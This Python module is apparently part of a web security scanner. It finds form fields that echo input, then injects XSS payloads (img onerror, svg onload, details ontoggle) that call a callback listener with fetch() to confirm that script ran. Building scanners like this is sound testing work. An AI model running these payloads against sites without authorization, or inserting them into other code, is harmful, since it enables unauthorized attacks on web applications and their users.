"""Simplified XSS scanner that injects payloads into discovered forms."""

from __future__ import annotations

from typing import Any, Dict, List

from playwright.sync_api import Browser, Page

from ...callback.server import register_payload, tracker

PAYLOAD_TEMPLATES = (
    "<img src=x onerror=fetch('{url}')>",
    "<svg onload=fetch('{url}')>",
    "<details open ontoggle=fetch('{url}')>",
)
MARKER = "__owasp_scanner_echo__"


class XSSScanner:
    def __init__(self, page: Page, browser: Browser, listener_url: str, origin_url: str, playwright_instance: Any):
        self.page = page
        self.browser = browser
        self.listener_url = listener_url.rstrip("/")
        self.origin_url = origin_url
        self.playwright = playwright_instance
        self.successful_echo_fields: List[Dict[str, str]] = []
        self.injected_payloads: List[Dict[str, str]] = []

    def _build_selector(self, field_identifier: str) -> str:
        attr = "name"
        value = field_identifier

        if "::" in field_identifier:
            prefix, value = field_identifier.split("::", 1)
            attr = {
                "id": "id",
                "aria": "aria-label",
                "placeholder": "placeholder",
                "data-testid": "data-testid",
            }.get(prefix, "name")

        escaped_value = value.replace("\\", "\\\\").replace('"', '\\"')
        return f"[{attr}=\"{escaped_value}\"]"

    def _get_field_locator(self, field_identifier: str):
        selector = self._build_selector(field_identifier)
        locator = self.page.locator(selector)

        if locator.count() == 0 and "::" in field_identifier:
            _, value = field_identifier.split("::", 1)
            fallback_selector = f"[name=\"{value.replace('\\', '\\\\').replace('"', '\\"')}\"]"
            fallback_locator = self.page.locator(fallback_selector)
            if fallback_locator.count() > 0:
                return fallback_locator

        return locator

    def _apply_payload(self, field_identifier: str, payload_id: str, template_index: int) -> Dict[str, str]:
        payload = PAYLOAD_TEMPLATES[template_index].format(url=f"{self.listener_url}?id={payload_id}")
        locator = self._get_field_locator(field_identifier)
        if locator.count() == 0:
            return {}

        input_field = locator.first
        input_field.fill(payload)
        input_field.press("Enter")

        if payload_id in tracker.injected:
            tracker.injected[payload_id].payload = payload

        return {
            "field": field_identifier,
            "payload_id": payload_id,
            "payload": payload,
        }

    def _echo_test(self, url: str, field_identifier: str) -> bool:
        self.page.goto(url, timeout=10000)
        locator = self._get_field_locator(field_identifier)
        if locator.count() == 0:
            return False
        input_field = locator.first
        input_field.fill(MARKER)
        input_field.press("Enter")
        self.page.wait_for_timeout(1500)
        return MARKER in self.page.content()

    def run(self, form_targets: List[Dict[str, Any]]) -> List[Dict[str, str]]:
        for form in form_targets:
            url = form.get("url_de_envio")
            campos: List[str] = form.get("campos", [])
            if not url or not campos:
                continue
            for field_identifier in campos:
                if not field_identifier:
                    continue
                try:
                    if self._echo_test(url, field_identifier):
                        self.successful_echo_fields.append({"url": url, "field": field_identifier})
                except Exception:
                    continue

        if not self.successful_echo_fields:
            return []

        for item in self.successful_echo_fields:
            url = item["url"]
            field_identifier = item["field"]
            self.page.goto(url, timeout=10000)
            for index, _ in enumerate(PAYLOAD_TEMPLATES):
                payload_id = register_payload(None, field_identifier, "", url)
                try:
                    record = self._apply_payload(field_identifier, payload_id, index)
                    if record:
                        self.injected_payloads.append(record)
                    self.page.wait_for_timeout(1500)
                except Exception:
                    continue

        return self.injected_payloads
